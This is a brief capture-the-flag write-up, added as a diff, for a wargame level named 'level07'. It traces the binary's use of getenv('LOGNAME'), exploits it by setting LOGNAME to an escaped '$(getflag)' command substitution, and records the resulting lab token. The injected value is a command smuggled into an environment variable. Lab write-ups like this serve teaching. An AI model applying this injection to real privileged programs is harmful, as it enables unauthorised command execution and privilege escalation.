@@ -1,0 +1,10 @@
+🔻 Analyze
+⬇️ ltrace ./level07
+👉 getenv("LOGNAME")
+
+
+🔻 Hack
+⬇️ export LOGNAME=\$\(getflag\)
+⬇️ env | grep LOGNAME
+⬇️ ./level07
+👉 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
